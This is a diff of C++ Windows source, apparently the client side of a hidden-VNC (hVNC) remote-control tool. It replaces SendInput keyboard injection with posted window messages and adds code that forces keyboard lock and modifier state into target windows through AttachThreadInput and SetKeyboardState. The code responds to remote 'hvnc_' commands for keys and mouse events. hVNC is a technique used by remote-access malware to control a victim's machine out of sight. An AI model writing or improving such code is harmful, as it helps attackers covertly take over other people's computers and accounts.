@@ -779,25 +779,6 @@ static bool send_mouse_input(int normX, int normY, DWORD flags, DWORD mouseData 
     return SendInput(1, &input, sizeof(INPUT)) == 1;
 }
 
-static bool send_key_input(WORD vk, bool down) {
-    INPUT input{};
-    input.type = INPUT_KEYBOARD;
-    input.ki.wVk = vk;
-    input.ki.dwFlags = down ? 0 : KEYEVENTF_KEYUP;
-    return SendInput(1, &input, sizeof(INPUT)) == 1;
-}
-
-static bool send_unicode_input(WCHAR ch) {
-    INPUT inputs[2]{};
-    inputs[0].type = INPUT_KEYBOARD;
-    inputs[0].ki.wScan = ch;
-    inputs[0].ki.dwFlags = KEYEVENTF_UNICODE;
-    inputs[1].type = INPUT_KEYBOARD;
-    inputs[1].ki.wScan = ch;
-    inputs[1].ki.dwFlags = KEYEVENTF_UNICODE | KEYEVENTF_KEYUP;
-    return SendInput(2, inputs, sizeof(INPUT)) == 2;
-}
-
 static LPARAM key_lparam(WORD vk, bool keyUp) {
     UINT scan = MapVirtualKeyW(vk, MAPVK_VK_TO_VSC);
     LPARAM lp = 1 | (scan << 16);
@@ -805,17 +786,56 @@ static LPARAM key_lparam(WORD vk, bool keyUp) {
     return lp;
 }
 
-static void post_key_fallback(HWND hwnd, int vk, const string& action) {
-    if (!hwnd || !IsWindow(hwnd)) return;
-    client_log("keyboard fallback PostMessage action=" + action +
-               " vk=" + to_string(vk) +
-               " hwnd=" + to_string((uintptr_t)hwnd));
-    if (action == "hvnc_keydown") {
-        PostMessageW(hwnd, WM_KEYDOWN, (WPARAM)vk, key_lparam((WORD)vk, false));
-    } else if (action == "hvnc_keyup") {
-        PostMessageW(hwnd, WM_KEYUP, (WPARAM)vk, key_lparam((WORD)vk, true));
-    } else if (action == "hvnc_char") {
-        PostMessageW(hwnd, WM_CHAR, (WPARAM)vk, 1);
+static void sync_keyboard_state(HWND hTarget, int lockState, int modifierState) {
+    if (!hTarget) return;
+    DWORD targetThreadId = GetWindowThreadProcessId(hTarget, NULL);
+    DWORD currentThreadId = GetCurrentThreadId();
+
+    BYTE remoteState[256];
+    if (AttachThreadInput(currentThreadId, targetThreadId, TRUE)) {
+        GetKeyboardState(remoteState);
+
+        // Lock states: bit 0: Caps, 1: Num, 2: Scroll
+        bool desiredCaps = (lockState & 0x01) != 0;
+        bool desiredNum = (lockState & 0x02) != 0;
+        bool desiredScroll = (lockState & 0x04) != 0;
+
+        bool changed = false;
+        if (((remoteState[VK_CAPITAL] & 0x01) != 0) != desiredCaps) {
+            remoteState[VK_CAPITAL] = desiredCaps ? (remoteState[VK_CAPITAL] | 0x01) : (remoteState[VK_CAPITAL] & ~0x01);
+            changed = true;
+        }
+        if (((remoteState[VK_NUMLOCK] & 0x01) != 0) != desiredNum) {
+            remoteState[VK_NUMLOCK] = desiredNum ? (remoteState[VK_NUMLOCK] | 0x01) : (remoteState[VK_NUMLOCK] & ~0x01);
+            changed = true;
+        }
+        if (((remoteState[VK_SCROLL] & 0x01) != 0) != desiredScroll) {
+            remoteState[VK_SCROLL] = desiredScroll ? (remoteState[VK_SCROLL] | 0x01) : (remoteState[VK_SCROLL] & ~0x01);
+            changed = true;
+        }
+
+        // Modifiers: bit 0: Shift, 1: Ctrl, 2: Alt
+        bool desiredShift = (modifierState & 0x01) != 0;
+        bool desiredCtrl = (modifierState & 0x02) != 0;
+        bool desiredAlt = (modifierState & 0x04) != 0;
+
+        if (((remoteState[VK_SHIFT] & 0x80) != 0) != desiredShift) {
+            remoteState[VK_SHIFT] = desiredShift ? 0x80 : 0;
+            changed = true;
+        }
+        if (((remoteState[VK_CONTROL] & 0x80) != 0) != desiredCtrl) {
+            remoteState[VK_CONTROL] = desiredCtrl ? 0x80 : 0;
+            changed = true;
+        }
+        if (((remoteState[VK_MENU] & 0x80) != 0) != desiredAlt) {
+            remoteState[VK_MENU] = desiredAlt ? 0x80 : 0;
+            changed = true;
+        }
+
+        if (changed) {
+            SetKeyboardState(remoteState);
+        }
+        AttachThreadInput(currentThreadId, targetThreadId, FALSE);
     }
 }
 
@@ -957,27 +977,22 @@ static void input_loop() {
         // ---- Klavye ----
         if (action == "hvnc_keydown" || action == "hvnc_keyup" || action == "hvnc_char") {
             int vk = cmd.value("keycode", 0);
-            HWND hTarget = g_hCurrentFocus;
-            if (!hTarget || !IsWindow(hTarget)) hTarget = GetForegroundWindow();
-            if (!hTarget || !IsWindow(hTarget)) continue;
+            int lockState = cmd.value("lock_state", 0);
+            int modifierState = cmd.value("modifier_state", 0);
 
-            SetForegroundWindow(GetAncestor(hTarget, GA_ROOT));
-            SetFocus(hTarget);
+            HWND hTarget = GetFocusedWindow();
+            if (!hTarget) continue;
 
-            bool sendInputOk = false;
+            sync_keyboard_state(hTarget, lockState, modifierState);
+
             if (action == "hvnc_keydown") {
-                sendInputOk = send_key_input((WORD)vk, true);
+                PostMessageW(hTarget, WM_KEYDOWN, (WPARAM)vk, key_lparam((WORD)vk, false));
             } else if (action == "hvnc_keyup") {
-                sendInputOk = send_key_input((WORD)vk, false);
+                PostMessageW(hTarget, WM_KEYUP, (WPARAM)vk, key_lparam((WORD)vk, true));
             } else if (action == "hvnc_char") {
-                sendInputOk = send_unicode_input((WCHAR)vk);
+                PostMessageW(hTarget, WM_CHAR, (WPARAM)vk, 1);
             }
-            if (!sendInputOk) {
-                client_log("SendInput failed action=" + action +
-                           " vk=" + to_string(vk) +
-                           " error=" + to_string(GetLastError()));
-            }
-            post_key_fallback(hTarget, vk, action);
+
             g_forceFullFrame = true;
             continue;
         }
@@ -991,7 +1006,16 @@ static void input_loop() {
 
         if (action == "hvnc_mousemove") {
             g_forceFullFrame = true;
+            int lockState = cmd.value("lock_state", 0);
+            int modifierState = cmd.value("modifier_state", 0);
+
             send_mouse_input(normX, normY, MOUSEEVENTF_MOVE);
+
+            HWND hwndUnderMouse = WindowFromPoint(screenPt);
+            if (hwndUnderMouse) {
+                sync_keyboard_state(hwndUnderMouse, lockState, modifierState);
+            }
+
             if (g_dragging && g_dragHwnd) {
                 int dx = screenPt.x - g_dragStartPt.x;
                 int dy = screenPt.y - g_dragStartPt.y;
@@ -1041,9 +1065,14 @@ static void input_loop() {
         if (action == "hvnc_mousedown") {
             g_forceFullFrame = true;
             int  btn  = cmd.value("button", 0);
+            int lockState = cmd.value("lock_state", 0);
+            int modifierState = cmd.value("modifier_state", 0);
+
             if (btn < 0 || btn > 2) btn = 0;
             HWND hwnd = WindowFromPoint(screenPt);
             if (!hwnd) continue;
+
+            sync_keyboard_state(hwnd, lockState, modifierState);
 
             HWND hRoot = GetAncestor(hwnd, GA_ROOT);
             g_hLastWindow = hRoot;
@@ -1103,6 +1132,9 @@ static void input_loop() {
         if (action == "hvnc_mouseup") {
             g_forceFullFrame = true;
             int  btn = cmd.value("button", 0);
+            int lockState = cmd.value("lock_state", 0);
+            int modifierState = cmd.value("modifier_state", 0);
+
             if (btn < 0 || btn > 2) btn = 0;
             if (btn == 0 && g_dragging) {
                 g_dragging  = false;
@@ -1111,6 +1143,8 @@ static void input_loop() {
 
             HWND hwnd = WindowFromPoint(screenPt);
             if (!hwnd) continue;
+
+            sync_keyboard_state(hwnd, lockState, modifierState);
 
             LRESULT ht = HTCLIENT;
             SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y),
@@ -1135,9 +1169,14 @@ static void input_loop() {
         if (action == "hvnc_doubleclick") {
             g_forceFullFrame = true;
             int btn = cmd.value("button", 0);
+            int lockState = cmd.value("lock_state", 0);
+            int modifierState = cmd.value("modifier_state", 0);
+
             if (btn < 0 || btn > 2) btn = 0;
             HWND hwnd = WindowFromPoint(screenPt);
             if (!hwnd) continue;
+
+            sync_keyboard_state(hwnd, lockState, modifierState);
 
             LRESULT ht = HTCLIENT;
             SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y),
